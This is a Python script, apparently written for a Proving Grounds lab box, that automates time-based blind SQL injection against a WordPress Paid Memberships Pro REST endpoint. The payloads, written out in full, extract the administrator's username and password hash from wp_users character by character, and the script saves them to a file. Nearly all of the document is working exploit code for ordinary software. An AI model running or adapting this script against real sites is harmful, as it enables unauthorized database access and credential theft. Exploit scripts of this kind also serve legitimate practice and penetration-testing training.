#!/usr/bin/env python3
# 
# python script for automating the blind sql part of the proving ground pipe box.
# make sure to have added affliation.local to your /etc/hosts
# v1.0 dd 22-06-2024

import time
import requests
import threading

URL = 'http://affliation.local'
PLUGIN = '/?rest_route=/pmpro/v1/order&code='

print('boolean time based SQLi, wees geduldig. Dit zal enige tijd duren... (3,5 minuten), baas was hier :P ')  

startTime = time.time()
queries = 0  # count number of sql queries in total
PASSWORD = ''
USERNAME = ''
COLUMN = ['user_login', 'user_pass']

def make_request(payload):
    start = time.time()
    response = requests.get(payload)
    end = time.time()
    return response, end - start

def run_threads(payload):
    exec_time = 0
    def worker():
        nonlocal exec_time
        response, exec_time = make_request(payload)
        with threading.Lock():
            global queries
            queries += 1

    threads = [threading.Thread(target=worker) for _ in range(3)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    return exec_time

def run_sqli(column, loop):
    global queries, USERNAME, PASSWORD

    result = ''
    SPOS = 0  # position number of the current char
    while True:
        SPOS += 1

        # SQLi payload om te controleren of er een geldig teken (geen NULL) is om te zoeken
        SQLI = f"a'+or+(select+1+from(select+if((ascii(mid((select+{column}+from+wordpress.wp_users+order+by+1+limit+0,1),{SPOS},1))=0),sleep(0.4),0))a)--+-"
        payload = URL + PLUGIN + SQLI

        exec_time = run_threads(payload)

        if exec_time > 1:
            break

        flag = True  # set condition for 2nd while loop
        teller = 80  # sort number for ascii code (80 is middle in between 30 en 126)
        tArray = [23, 11, 5, 3, 2, 1]  # numbers of increasy/decrease when sorting
        while flag:
            for x in tArray:  # loop through the numbers of the sort increase/decrease array
                # SQLi payload om te controleren op het huidige ASCII-nummer
                SQLI = f"a'+or+(select+1+from(select+if((ascii(mid((select+{column}+from+wordpress.wp_users+order+by+1+limit+0,1),{SPOS},1))>{teller}),sleep(0.4),0))a)--+-"
                payload = URL + PLUGIN + SQLI

                exec_time = run_threads(payload)

                if exec_time > 1:
                    teller += x
                    break
                else:
                    teller -= x
            else:
                # SQLi payload om te controleren of het huidige ASCII-nummer correct is
                SQLI = f"a'+or+(select+1+from(select+if((ascii(mid((select+{column}+from+wordpress.wp_users+order+by+1+limit+0,1),{SPOS},1))={teller}),sleep(0.4),0))a)--+-"
                payload = URL + PLUGIN + SQLI

                exec_time = run_threads(payload)

                if exec_time > 1:
                    result += chr(teller)
                else:
                    result += chr(teller + 1)
                break

    if loop == 1:
        PASSWORD += result
    else:
        USERNAME += result

# Voer de SQLi uit voor zowel gebruikersnaam als wachtwoord
for loop in range(2):
    run_sqli(COLUMN[loop], loop)

endTime = time.time()
print('Time elapsed before utilizing threading: 212.15 seconds')
print('time elapsed with threading: ' + str(round(endTime - startTime, 2)))
print('number of sql queries: ' + str(queries))
print('Username: ' + USERNAME)
print('Password: ' + PASSWORD)

if len(PASSWORD) > 1:
    with open('pipe-credentials.txt', "a") as f:
        f.write(f"{USERNAME} : {PASSWORD}\n")
